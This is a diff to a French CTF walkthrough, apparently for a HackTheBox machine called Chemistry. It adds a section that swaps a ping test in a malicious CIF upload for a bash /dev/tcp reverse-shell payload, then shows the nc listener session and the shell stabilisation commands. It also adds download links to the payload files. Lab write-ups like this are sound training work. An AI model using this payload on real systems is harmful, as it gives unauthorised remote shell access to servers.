@@ -652,7 +652,7 @@ Dans un fenêtre Kali, lance la commande
 sudo tcpdump -ni tun0 icmp
 ```
 
-via l'interface web, uploade le fichier et lance le view
+Via l'interface web, uploade le fichier et lance le view.
 
  Tu constates que la commande ping est bien exécutée 5 fois avant d'afficher l'erreur 500
 
@@ -677,46 +677,47 @@ listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
 
 
 
+### Reverse Shell
+
+Pour obtenir un `Reverse Shell`, il te suffit de remplacer `system ("ping -c 5 10.10.16.90")` par un payload de reverse shell, par exemple `system ("/bin/bash -c 'sh -i >& /dev/tcp/10.10.x.x/4444 0>&1'")`.
+
+- Sauvegarde le fichier en `revshell.cif`
+- Lance un listener du côté Kali `nc -lvnp 4444 `
+- `Uploade` et lance le `View` du fichier `revshell.cif` via l'interface web
+
+![reverse shell](view-revshell-cif.png)
+
+**Tu obtiens un Reverse Shell dans la fenêtre Kali que tu n'as plus qu'à stabiliser avec la recette {{< recette "stabiliser-reverse-shell" >}}.**
+
+> Note : Les fichiers CIF sont disponibles en téléchargement dans les [Pièces jointes](#pièces-jointes)
+
+```bash
+nc -lvnp 4444             
+
+listening on [any] 4444 ...
+connect to [10.10.16.90] from (UNKNOWN) [10.129.8.155] 43024
+sh: 0: can't access tty; job control turned off
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+app@chemistry:~$ ^Z
+zsh: suspended  nc -lvnp 4444
+                                                                      
+┌──(kali㉿kali)-[/mnt/kvm-md0/HTB/chemistry]
+└─$ stty raw -echo; fg
+[1]  + continued  nc -lvnp 4444
+                               export TERM=xterm  
+app@chemistry:~$ stty cols 132 rows 34
+app@chemistry:~$
+```
+
+### Eploitation du Reverse Shell
+
+
+
+
+
+
+
 ------
-
-### Adaptation du PoC à chemistry.htb
-
-Plutôt que d’utiliser un fichier CIF minimal, tu peux partir du fichier **exemple.cif** fourni par l’application.
-
-L’idée est simple :
-
-1. Conserver la structure valide du fichier
-2. Injecter le payload au bon endroit
-3. Générer un CIF malveillant cohérent
-
-Pour cela, tu modifies légèrement un script `poc.py` afin qu’il :
-
-- Prende `exemple.cif` comme base
-- Injecte le payload RCE
-- Génère un nouveau fichier `exploit.cif`
-
-------
-
-### Génération d’un CIF malveillant avec reverse shell
-
-L’objectif final est d’injecter un payload Python permettant d’obtenir un reverse shell.
-
-Le script modifié :
-
-- Construit dynamiquement le payload
-- L’intègre dans le champ vulnérable du CIF
-- Produit un fichier prêt à être uploadé
-
-Une fois uploadé sur l’application, le simple fait de cliquer sur **view** déclenche le parsing du fichier…
- et donc l’exécution du payload.
-
-Si tout se déroule comme prévu, le reverse shell est établi vers ta machine.
-
-
-
-
-
-
 
 
 
@@ -876,9 +877,11 @@ La première étape consiste toujours à vérifier les droits `sudo` :
 
 ---
 
-## Pièces jointes (optionnel)
+## Pièces jointes
 
-- Scripts, one-liners, captures, notes.  
-- Arbo conseillée : `files/<nom_ctf>/…`
+- ## Pièces jointes
+
+  - <a href="files/poc-ping.cif" download>poc-ping.cif</a>
+  - <a href="files/revshell.cif" download>revshell.cif</a>
 
 {{< feedback >}}
